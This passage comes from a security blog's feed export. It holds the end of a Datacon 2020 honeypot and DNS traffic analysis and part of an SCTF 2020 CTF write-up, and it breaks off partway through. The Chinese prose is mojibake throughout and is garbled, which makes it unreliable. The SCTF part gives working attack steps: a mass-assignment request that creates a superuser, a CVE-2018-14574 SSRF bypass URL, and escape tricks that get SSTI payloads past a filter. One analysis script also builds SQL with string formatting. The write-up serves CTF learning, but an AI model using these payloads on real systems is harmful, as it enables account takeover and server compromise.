pymysql.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;datacon&quot;</span>)</span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">path1 = <span class="string">&quot;access.csv&quot;</span></span><br><span class="line">sql = <span class="string">&#x27;INSERT INTO access(id,domain,ip_hash,times) VALUES (%s,%s,%s,%s)&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = <span class="number">1</span></span><br><span class="line">error = <span class="number">0</span></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path1, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line_data = f.readline()</span><br><span class="line">        <span class="keyword">if</span> line_data:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                domain,ip_hash,times = line_data.strip().split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="built_in">id</span>,line_data.strip().split(<span class="string">&quot;,&quot;</span>))</span><br><span class="line">                error += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            tmp.append((<span class="built_in">id</span>,domain,ip_hash,<span class="built_in">int</span>(times)))</span><br><span class="line">            <span class="built_in">id</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cursor.executemany(sql, tmp)</span><br><span class="line">                db.commit()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">id</span> % <span class="number">500</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cursor.executemany(sql, tmp)</span><br><span class="line">                db.commit()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line">            tmp = []</span><br><span class="line">print(error)</span><br></pre></td></tr></table></figure><p>å¤„ç†æ•°æ®æ—¶ï¼ŒAccess.csv éƒ¨åˆ†æ•°æ®æœ‰äº›é—®é¢˜ï¼Œå¦‚6416è¡Œï¼Œ217333è¡Œï¼Œç›´æ¥è·³è¿‡å¤„ç†äº†ï¼Œè¿˜ä¸å°‘ï¼Œå¤§éƒ¨åˆ†æ˜¯å¤šäº†è¯·æ±‚çš„ipã€‚</p><p><img src="/2020/08/16/2020-Datacon/image-20200722223835665.png" alt="image-20200722223835665"></p><p>ç»å¤§éƒ¨åˆ†è¯·æ±‚ipéƒ½æ˜¯ cfda2160b0298e40a2d3fbe79e8d309aï¼Œæ„Ÿè§‰å¯¹åšé¢˜æ²¡å•¥å½±å“ï¼Œå› ä¸ºèœœç½æ•°æ®é‡Œæ ¹æœ¬å°±æ²¡æœ‰è¿™ä¸ªipã€‚</p><p>å¯¼å…¥åº“åï¼Œå¤§ä½“è§‚å¯Ÿä¸€ä¸‹ï¼Œå¯»æ‰¾æ¼æ´ç‰¹å¾ã€‚</p><p>å¦‚æœåˆ©ç”¨ xcgi é‚£ä¸ªæ¼æ´ï¼ŒæŒ‰ç…§ xgoahead æºç çš„è·¯ç”±ï¼Œè¦è®¿é—® /xcgiï¼Œä¸è¿‡æ²¡å‘ç°è¿™æ ·çš„æµé‡ã€‚éœ€è¦ä¸Šä¼ æ¶æ„ so æ–‡ä»¶ï¼Œæµé‡é‡Œä¹Ÿæœ‰ä¼  elf çš„ã€‚</p><p><img src="/2020/08/16/2020-Datacon/image-20200723152421269.png" alt="image-20200723152421269"></p><p>ï¼ˆä¸è¿‡å‘ç°æœ‰çš„ elf æ‹–ä¸‹æ¥é€†å‘åˆ†æï¼Œæ²¡å•¥æ¶æ„è¡Œä¸ºï¼‰</p><p>çœ‹ä¸€ä¸‹æœ‰å¤šå°‘ ip å‘å‡ºäº†ä¸Šä¼  so çš„è¯·æ±‚ï¼š</p><p><img src="/2020/08/16/2020-Datacon/image-20200723152527842.png" alt="image-20200723152527842"></p><p>å‘ç°æ˜¯ 65 ä¸ªï¼Œå¯ä»¥æŠŠè¿™äº› ip æ‹¿å‡ºæ¥ï¼Œå» access.csv çœ‹ä¸€ä¸‹è¿™äº› ip çš„ dnsè¯·æ±‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">db = pymysql.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;datacon&quot;</span>)</span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">&quot;select distinct src_ip from honeypot  where locate(&#x27;7fELF&#x27;,body)&gt;0&quot;</span>)</span><br><span class="line">elf_ip = []</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> cursor.fetchall():</span><br><span class="line">    elf_ip.append(data[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> elf_ip:</span><br><span class="line">    cursor.execute(<span class="string">&quot;select distinct domain from access where ip_hash=&#x27;%s&#x27;&quot;</span>%ip)</span><br><span class="line">    print(cursor.fetchall())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç° passivedns ä¸­åªæœ‰å…¶ä¸­ä¸¤ä¸ª ip çš„è®°å½• ï¼š 625210b633ed23166798790a3180b6dc ä¸ eef5239efd6c7cc9f2e08f4a6f45d76bã€‚çœ‹äº†ä¸‹èœœç½æµé‡ï¼Œä¸¤ä¸ª ip éƒ½æ˜¯åªæœ‰ä¸€æ¡è®°å½•ï¼Œä¸Šä¼ çš„ elf æ‹–ä¸‹æ¥çœ‹äº†ä¸‹ä¹Ÿæ˜¯æ¶æ„çš„ï¼š</p><p><img src="/2020/08/16/2020-Datacon/image-20200723165321651.png" alt="image-20200723165321651"></p><p>è€Œä¸”æ–‡ä»¶åæœ‰ <code>tmp/tmp-0.tmp</code>ï¼Œå’Œä¹‹å‰ä¿®æ”¹çš„é‚£éƒ¨åˆ†ä»£ç å¯ä»¥å¯¹åº”ä¸Šã€‚</p><p>çœ‹èµ·æ¥è¿™ä¸¤ä¸ª ip è¿˜è¯·æ±‚äº†ä¸å°‘æ­£å¸¸çš„åŸŸåï¼ŒC2 åŸŸååº”è¯¥æ˜¯å…¬å…±çš„å§ï¼ŒæŠŠè¿™ä¸¤ä¸ª ip è¯·æ±‚çš„åŸŸåå–ä¸‹äº¤é›†ï¼Œäººå·¥çœ‹ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ª .ga åç¼€çš„åŸŸåï¼Œè¿™ä¸ªåŸŸåå°±æ˜¯æœ€ç»ˆçš„C2åŸŸåã€‚</p><p>PSï¼šæµé‡é‡Œ bypass è¿‡æ»¤çš„æ–¹æ³•æ˜¯æŠŠ LD_PRELOAD æ”¾åˆ°è¡¨å•é‡Œä¸Šä¼ ã€‚</p><h2 id="é¢˜ç›®ä¿®æ”¹"><a href="#é¢˜ç›®ä¿®æ”¹" class="headerlink" title="é¢˜ç›®ä¿®æ”¹"></a>é¢˜ç›®ä¿®æ”¹</h2><p>å‡ºé¢˜äººæœ¬æ„æ˜¯æƒ³è®©é€‰æ‰‹å…ˆåˆ†æå¤„æ¼æ´bypassçš„åˆ©ç”¨æ–¹å¼ï¼Œå†é€šè¿‡expæ‰¾æ”»å‡»è¿‡æµé‡ï¼Œæœ€åæ‰¾C2åŸŸåã€‚æ˜¾ç„¶æˆ‘çš„æ–¹æ³•å±äºæŠŠç­”æ¡ˆå·äº†å‡ºæ¥ã€‚ä¸€æ³¢è®¨è®ºå‡ºé¢˜äººå¯¹é¢˜ç›®è¿›è¡Œäº†ä¸€äº›ä¿®æ”¹ï¼š</p><ol><li>æäº¤å†…å®¹æ”¹æˆäº†å¯èƒ½å—æ„ŸæŸ“çš„IPã€‚</li><li>xgoaheadä»£ç è¿›è¡Œäº†è°ƒæ•´ï¼ŒæŠŠ count++ é‚£å—çš„ä¿®æ”¹ç§»é™¤äº†ï¼ˆå¤ªåˆ»æ„äº†ï¼‰ï¼Œå¢å¤§é€‰æ‰‹åˆ†æéš¾åº¦ã€‚</li><li>ä¹‹å‰æˆ‘æŠŠæ‰€æœ‰ä¸Šä¼ elfçš„ipéƒ½å» passivedns æŸ¥äº†ä¸ªéï¼Œæœ‰dnsè®°å½•çš„ipå°±æ˜¯æ”»å‡»ipï¼Œå‡ºé¢˜äººè¿™æ¬¡æŠŠæµé‡ä¸­çš„æ”»å‡»ipå¢åŠ äº†ä¸¤ä¸ªï¼ŒåŒæ—¶ dns ä¸­è¿˜æ²¡æœ‰ç›¸åº”è¯·æ±‚è®°å½•ã€‚ä¸è¿‡å¯ä»¥æŒ‰ç…§æˆ‘åŸæ¥çš„æ–¹æ³•æ‰¾åˆ°é‚£ä¸¤ä¸ªipï¼Œå›è¿‡å¤´åˆ†ææµé‡ä¸­expç‰¹å¾ï¼Œå†ç­›é€‰è¿™æ ·å°±å¯ä»¥æ‰¾å‡ºå…¨éƒ¨çš„å››ä¸ªipäº†ï¼Œæ‰€ä»¥å‡ºé¢˜äººæœ€ååº”è¯¥æ˜¯åœ¨passivednsä¸­åˆ é™¤äº†è¿™å››ä¸ªipçš„è¯·æ±‚è®°å½•ã€‚</li><li>å¯¹æµé‡ä¸­ä¸Šä¼ çš„ elf åšäº†äº›æ–‡ç« ï¼Œé€‰æ‰‹éœ€è¦å»åˆ†ææ¶æ„elfçš„è¡Œä¸ºï¼Œä»è€Œé€šè¿‡ passivedns æ‰¾å‡ºå‰©ä½™çš„å—æ„ŸæŸ“ IPã€‚</li></ol><p>æ‰€ä»¥é¢˜ç›®æ­£è§£è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>åˆ†ææ¼æ´ï¼Œæ‰¾åˆ° bypass WAFæ–¹å¼ã€‚</li><li>é€šè¿‡expï¼Œæå–æ”»å‡»æµé‡ï¼Œè·å¾—å››ä¸ªIPã€‚</li><li>åˆ†æELFè¡Œä¸ºï¼Œå» passivedns é‡Œæ‰¾å‡ºå‰©ä¸‹çš„ IPã€‚</li></ol><p>åé¢åˆ†æ ELF éƒ¨åˆ†æˆ‘æ²¡æœ‰åšäº†ï¼Œè¯¦ç»†å¯è§é˜¿é‡Œäº‘å®‰å…¨çš„ writeupï¼š<a href="https://zhuanlan.zhihu.com/p/186254809?utm_source=wechat_session&utm_medium=social&utm_oi=771453567763492864&utm_content=sec&wechatShare=2&s_r=0">https://zhuanlan.zhihu.com/p/186254809?utm_source=wechat_session&amp;utm_medium=social&amp;utm_oi=771453567763492864&amp;utm_content=sec&amp;wechatShare=2&amp;s_r=0</a></p><p>ä¸è¿‡é¢˜ç›®è¿˜æ˜¯æœ‰ä¸€äº›æŠ•æœºå–å·§çš„åŠæ³•çš„ï¼Œå¯ä»¥æŠŠæ‰€æœ‰ä¸Šä¼ elfçš„æµé‡éƒ½æ‹–ä¸‹æ¥ï¼Œå°±60å¤šä¸ªipä¼ äº†elfï¼Œç„¶åå¯ä»¥äººå·¥åˆ†æä¸€æ³¢ï¼Œåº”è¯¥å°±ä¸¤ç§æµé‡ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æ— æ³• bypass WAFçš„æƒ…å†µä¸‹æ‰¾åˆ°æ”»å‡»æµé‡ã€‚è¿™ç§æ–¹æ³•æœ€åä¹Ÿæ²¡æœ‰å µæ­»ï¼Œç•™ä¸€ç§trickçš„åšé¢˜æ–¹æ³•23333ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ¬¡èµ›é¢˜è¯„ä¼°è¿˜æ˜¯å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿çš„ã€‚</p><ol><li>å‹‰å¼ºç®—æ˜¯å…¥äº†é—¨é€†å‘orz</li><li>sample3 è¿™ä¸ªé€†æ¨æ€è·¯æ¯”è¾ƒæ–°é¢–ï¼ŒCTFçš„å¯†ç å­¦é¢˜ç›®ä¹Ÿæ²¡æ¥è§¦è¿‡è¿™ç±»</li><li>å¤§æ•°æ®æµé‡çš„åˆ†æï¼Œé æ‰‹å·¥å’Œ python è„šæœ¬åˆ†æä¸å¤Ÿæ–¹ä¾¿ï¼Œå…¥åº“æ“ä½œè¿˜æ˜¯æ¯”è¾ƒèˆ’æœ</li><li>å­¦ä¹ äº† xgoahead bypass WAFçš„å§¿åŠ¿ï¼Œå…¶å®åˆ†æé‚£ä¸ªæ¼æ´éœ€è¦åŠ¨æ€è°ƒ Cï¼Œè‡ªå·±ä¹Ÿä¸å¤ªç†Ÿ</li><li>â€¦</li></ol><p>çœ‹åˆ°ä»Šå¹´ Datacon åœ†æ»¡ç»“æŸï¼Œå¸Œæœ›å¤§å®¶ä¹Ÿèƒ½åœ¨è¿™æ¬¡ Datacon ä¸­æœ‰æ‰€æ”¶è·ï¼</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å»å¹´å‚åŠ äº†Datacon DNSæ¶æ„æµé‡æ–¹å‘çš„æ¯”èµ›ï¼Œæ‹¿äº†ç¬¬äº”ï¼Œå·®ç‚¹æ‹¿åˆ°å¥–orzï¼Œä»Šå¹´å‚åŠ äº†éƒ¨åˆ†èµ›é¢˜çš„å†…éƒ¨è¯„ä¼°ï¼Œä»¥ä¸‹æ˜¯åšé¢˜è®°å½•ã€‚&lt;/p&gt;</summary>
    
    
    
    
    <category term="Datacon" scheme="https://igml.top/tags/Datacon/"/>
    
  </entry>
  
  <entry>
    <title>2020 SCTF éƒ¨åˆ†wp</title>
    <link href="https://igml.top/2020/07/06/2020-SCTF/"/>
    <id>https://igml.top/2020/07/06/2020-SCTF/</id>
    <published>2020-07-06T03:56:38.000Z</published>
    <updated>2020-07-08T09:54:09.139Z</updated>
    
    <content type="html"><![CDATA[<p>Syclover æ¯”è¾ƒè‰¯å¿ƒï¼Œæ¯”èµ›ç»“æŸä¸ä¹…å°±æ”¾å‡ºäº† docker ä¸ wpï¼š<a href="https://github.com/SycloverSecurity/SCTF2020">https://github.com/SycloverSecurity/SCTF2020</a>ã€‚è·Ÿç€å¤ç°å­¦ä¹ ä¸€ä¸‹ã€‚</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>å‚è€ƒï¼š<a href="https://github.com/dlau/koa-body/issues/75">https://github.com/dlau/koa-body/issues/75</a>ã€‚</p><p>flagåœ¨å½“å‰ç›®å½•ä¸‹ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-8f0ae75ab256e48f.png" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-9e25d7938f052509.png" alt="image.png"></p><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>ä¸»è¦å‚è€ƒï¼š<a href="https://evi0s.com/2020/07/06/sctf-2020-web-writeup/">https://evi0s.com/2020/07/06/sctf-2020-web-writeup/</a>ã€‚</p><p>ç»™äº†dockerï¼Œåˆ†ææºç ã€‚</p><p>æˆ‘ä»¬éœ€è¦getshellï¼Œweb2 é‡Œæœ‰ä¸ªæ˜æ˜¾çš„ SSTIï¼Œä½†æ˜¯ web2 å¼€åœ¨é»˜è®¤çš„ 5000 ç«¯å£æ²¡æœ‰æ˜ å°„å‡ºæ¥ï¼Œæ˜¾ç„¶æ˜¯é€šè¿‡ web1 è¿›è¡Œ SSRFã€‚web1 ä¸­ rpcå¯ä»¥å‘å‡º post è¯·æ±‚ï¼Œä½†æ˜¯éœ€è¦æœ¬åœ°è®¿é—®ï¼Œ/home è·¯ç”±æä¾›äº†ä¸€ä¸ª SSRF çš„åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å¾ˆæ¸…æ™°äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;homeå¤„SSRF -&gt; flask_rpcå¤„SSRFè¯·æ±‚web2 -&gt; web2å¤„SSTI getshell</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸­é—´æœ‰å¾ˆå¤šé˜»ç¢ï¼š</p><ol><li>æˆ‘ä»¬éœ€è¦æ‹¿åˆ° tokenï¼Œæ‰å¯ä»¥ä½¿ç”¨ /home å¤„çš„ SSRF åŠŸèƒ½ï¼›</li><li>/home çš„ SSRF å¯¹ ip é™åˆ¶ä¸º 39.104.19.182ï¼Œè€Œæˆ‘ä»¬è¦ 127.0.0.1ï¼Œéœ€è¦bypassï¼›</li><li>web2 å¯¹ SSTI è¿›è¡Œäº†è¿‡æ»¤ï¼Œéœ€è¦ç»•è¿‡ <code>before_request</code> ä¸æ­£åˆ™ã€‚</li></ol><h3 id="è·å–-token"><a href="#è·å–-token" class="headerlink" title="è·å– token"></a>è·å– token</h3><p>å¯ä»¥å‘ç°ï¼Œç™»é™† admin å¯ä»¥æ‹¿åˆ° tokenã€‚</p><p>é—®é¢˜å‡ºåœ¨æ³¨å†Œè¿™é‡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;templates/reg.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.body)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(User.objects.<span class="built_in">filter</span>(username=data[<span class="string">&quot;username&quot;</span>])) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        User.objects.create_user(**data)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure><p>æŠŠ json loads ä¹‹åå…¨éƒ¨ä¼ è¿›äº† create_userï¼Œå¯¼è‡´ <a href="https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html">Mass Assignment vulnerability</a>ã€‚</p><p>æœ¬åœ°å‰ªä¸ª admin è´¦æˆ·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@8eb21982749e:/app/web1<span class="comment"># python3 manage.py createsuperuser --username=admin --email=admin@qq.com</span></span><br><span class="line">Password:</span><br><span class="line">Password (again):</span><br><span class="line">Superuser created successfully.</span><br><span class="line">MariaDB [django]&gt; select * from auth_user;</span><br><span class="line">+----+--------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+--------------+----------+-----------+----------------------------+</span><br><span class="line">| id | password                                                                       | last_login                 | is_superuser | username | first_name | last_name | email        | is_staff | is_active | date_joined                |</span><br><span class="line">+----+--------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+--------------+----------+-----------+----------------------------+</span><br><span class="line">|  1 | pbkdf2_sha256<span class="variable">$100000</span><span class="variable">$3xAODJylgYga</span><span class="variable">$G9hPEnmyXyCpNV9QUl16746Ga01bEXODvtK7XkflG80</span>= | 2020-07-05 13:14:38.941645 |            0 | gml      |            |           |              |        0 |         1 | 2020-07-05 13:10:43.134720 |</span><br><span class="line">|  3 | pbkdf2_sha256<span class="variable">$100000</span><span class="variable">$BnspmrIUg8nT</span><span class="variable">$vgQIE6</span>+vsVv/v0lqdp42coSGikFkPKrFpD1++IdJv0k= | NULL                       |            1 | admin    |            |           | admin@qq.com |        1 |         1 | 2020-07-07 02:50:19.953829 |</span><br></pre></td></tr></table></figure><p>ç…§ç€è¿™äº›ï¼Œä¼ è¿›å»å¤šä¸ª fieldsï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/reg/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 39.104.19.182</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json;charset=utf-8</span><br><span class="line"><span class="attribute">Referer</span>: http://39.104.19.182/reg/</span><br><span class="line"><span class="attribute">Content-Length</span>: 71</span><br><span class="line"><span class="attribute">Cookie</span>: sessionid=2clv87e4e3id9dxtsm86yn2x58vusr34; csrftoken=LaC7AyOPVLKhhZ6ZP3NNiBcSjTa7f27SQ22vpuWyWRtI6LqWYrwLkFcv8EDeL7PY</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;gmlgml&quot;,&quot;password&quot;:&quot;gmlgml&quot;,&quot;is_superuser&quot;:1,&quot;is_staff&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ³¨å†Œäº†ä¸ª admin çš„è´¦æˆ·ï¼Œç„¶å/admin ç™»é™†ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-9d636832635b6f82.png" alt="image.png"></p><p>å¯ä»¥æ‹¿åˆ° tokenã€‚</p><h3 id="SSRF-Whit-list-bypass"><a href="#SSRF-Whit-list-bypass" class="headerlink" title="SSRF Whit_list bypass"></a>SSRF Whit_list bypass</h3><p>è¿‡æ»¤çš„å¾ˆæ­»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf_check</span>(<span class="params">url ,white_list</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(white_list)):</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&quot;http://&quot;</span> + white_list[i] + <span class="string">&quot;/&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>Django==2.0.7 çš„ç‰ˆæœ¬ï¼Œæœ‰ä¸ª <a href="https://xz.aliyun.com/t/3302">CVE-2018-14574</a>ï¼Œå¯ä»¥ bypass è¿™ä¸ªè¿‡æ»¤ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.104.19.182&#x2F;&#x2F;127.0.0.1:8000&#x2F;rpc?</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¯·æ±‚ rpcäº†ã€‚</p><h3 id="SSTI-bypass"><a href="#SSTI-bypass" class="headerlink" title="SSTI bypass"></a>SSTI bypass</h3><p>é¦–å…ˆæœ‰ä¸ª WAFï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span>():</span></span><br><span class="line">    data = <span class="built_in">str</span>(request.data)</span><br><span class="line">    log()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&#123;&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;&#125;&#125;&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;&#123;%&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;%&#125;&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        abort(<span class="number">401</span>)</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯ jsonï¼Œæ”¯æŒ \u ç¼–ç ï¼Œç›´æ¥ç¼–ç å°±å¯ä»¥ç»•è¿‡ã€‚è¿™ä¸ªç‚¹åœ¨ 2018 å¹´ HCTF çš„ Kzone å‡ºç°è¿‡ï¼Œå½“æ—¶æ˜¯éé¢„æœŸï¼Œç”¨ \u ç¼–ç ç»•è¿‡äº†æ‰€æœ‰çš„sqlæ³¨å…¥çš„è¿‡æ»¤ã€‚</p><p>è¿˜æœ‰ä¸ªæ­£åˆ™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num1, re.I) <span class="keyword">or</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num2, re.I) <span class="keyword">or</span> <span class="keyword">not</span> re.search(<span class="string">&quot;[+\-*/]&quot;</span>, symbols):</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;?&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p>num1 å’Œ num2 ä¸èƒ½å‡ºç°è‹±æ–‡å­—ç¬¦ã€‚å› ä¸ºè¿™æ˜¯åœ¨è§£ç åäº†ï¼Œæ²¡æ³•ç”¨ json ç¼–ç ç»•è¿‡ã€‚</p><p>ä½¿ç”¨ Python 8 è¿›åˆ¶è½¬ä¹‰å­—ç¬¦ç»•è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> âœ˜ âš™ î‚° ~ î‚° python3</span><br><span class="line">Python <span class="number">3.7</span><span class="number">.4</span> (default, Jul  <span class="number">9</span> <span class="number">2019</span>, <span class="number">18</span>:<span class="number">13</span>:<span class="number">23</span>)</span><br><span class="line">[Clang <span class="number">10.0</span><span class="number">.1</span> (clang<span class="number">-1001.0</span><span class="number">.46</span><span class="number">.4</span>)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;\123&#x27;</span></span><br><span class="line"><span class="string">&#x27;S&#x27;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ç§æ–¹å¼ä»…ä»…å¯ä»¥æ¸²æŸ“å‡ºå­—ç¬¦ï¼Œç±»ä¼¼ä½¿ç”¨ <code>.</code>æ¥è¿›è¡Œæ–¹æ³•è°ƒç”¨ï¼Œæ¯”å¦‚ os.popenï¼Œè¿™ç§éƒ½æ˜¯æ— æ•ˆçš„ï¼Œæœ‰äº›å¯ä»¥é€šè¿‡ [â€˜popenâ€™] è¿™ç§å¼•ç”¨è¿™ç§æ–¹æ³•è¿›è¡Œç»•è¿‡ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„ SSTI 